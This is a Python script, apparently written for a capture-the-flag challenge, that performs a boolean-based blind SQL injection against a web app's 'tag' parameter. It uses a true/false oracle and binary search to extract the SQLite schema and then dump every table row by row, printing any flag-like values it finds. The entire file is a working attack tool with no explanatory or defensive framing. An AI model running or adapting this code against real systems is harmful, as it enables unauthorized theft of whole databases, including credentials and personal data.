import requests, sys, time

BASE_URL = "http://10.110.3.72:8034"
session  = requests.Session()

# Any post title that only renders when the OR-clause is TRUE.
SENTINEL = "The daily byte goes to print"

def oracle(cond, retries=3):
    payload = f"zzz' OR ({cond}) -- -"
    for _ in range(retries):
        try:
            r = session.get(BASE_URL, params={"tag": payload}, timeout=8)
            return SENTINEL in r.text
        except requests.RequestException:
            time.sleep(0.3)
    return False

def exists(subq):
    return oracle(f"EXISTS({subq})")

def get_int(expr, hi=0xFFFF):
    lo = 0
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle(f"({expr}) > {mid}"): lo = mid + 1
        else:                            hi = mid
    return lo

def extract(expr, max_len=2000, label=""):
    out = ""
    for i in range(1, max_len + 1):
        if not oracle(f"LENGTH(SUBSTR(({expr}),{i},1)) = 1"):
            break
        c = get_int(f"UNICODE(SUBSTR(({expr}),{i},1))")
        out += chr(c)
        if label:
            print(f"\r  [{label}] {out!r}", end="", flush=True)
    if label and out:
        print()
    return out

def list_tables():
    tables, i = [], 0
    while True:
        sub = (f"SELECT 1 FROM sqlite_master WHERE type='table' "
               f"AND name NOT LIKE 'sqlite_%' ORDER BY name LIMIT 1 OFFSET {i}")
        if not exists(sub): break
        name = extract(f"SELECT name FROM sqlite_master WHERE type='table' "
                       f"AND name NOT LIKE 'sqlite_%' ORDER BY name LIMIT 1 OFFSET {i}",
                       max_len=100, label=f"tbl[{i}]")
        sql  = extract(f"SELECT sql  FROM sqlite_master WHERE type='table' "
                       f"AND name NOT LIKE 'sqlite_%' ORDER BY name LIMIT 1 OFFSET {i}",
                       max_len=2000)
        print(f"[+] Table {name!r}\n    {sql}")
        tables.append(name)
        i += 1
    return tables

def list_cols(table):
    cols, i = [], 0
    while True:
        sub = f"SELECT 1 FROM pragma_table_info('{table}') LIMIT 1 OFFSET {i}"
        if not exists(sub): break
        name = extract(f"SELECT name FROM pragma_table_info('{table}') LIMIT 1 OFFSET {i}",
                       max_len=100, label=f"{table}.col[{i}]")
        typ  = extract(f"SELECT type FROM pragma_table_info('{table}') LIMIT 1 OFFSET {i}",
                       max_len=50)
        cols.append(name)
        print(f"    col: {name!r} ({typ})")
        i += 1
    return cols

def get_length(expr, hi=200000):
    return get_int(f"LENGTH(({expr}))", hi=hi)

def dump(table, cols):
    print(f"\n[*] Dumping {table}")
    row = 0
    while True:
        sub = f'SELECT 1 FROM "{table}" LIMIT 1 OFFSET {row}'
        if not exists(sub): break
        vals = {}
        for c in cols:
            cell = f'SELECT "{c}" FROM "{table}" LIMIT 1 OFFSET {row}'
            n = get_length(cell)
            if n > 4000:
                v = f"<blob len={n}>"
                print(f"  row {row}.{c}: {v}")
            else:
                v = extract(cell, max_len=n + 1, label=f"{table}[{row}].{c}")
            vals[c] = v
        print(f"  row {row}: {vals}")
        for k, v in vals.items():
            if isinstance(v, str) and ("flag{" in v.lower() or "ctf{" in v.lower()):
                print(f"  >>> FLAG-LIKE: {table}[{row}].{k} = {v}")
        row += 1

def main():
    # Sanity: 1=1 must be True, 1=0 must be False.
    if not oracle("1=1") or oracle("1=0"):
        print("[-] Oracle test failed — check SENTINEL and comment style")
        sys.exit(1)
    print("[+] Oracle OK")

    for name in list_tables():
        cols = list_cols(name)
        dump(name, cols)

if __name__ == "__main__":
    main()
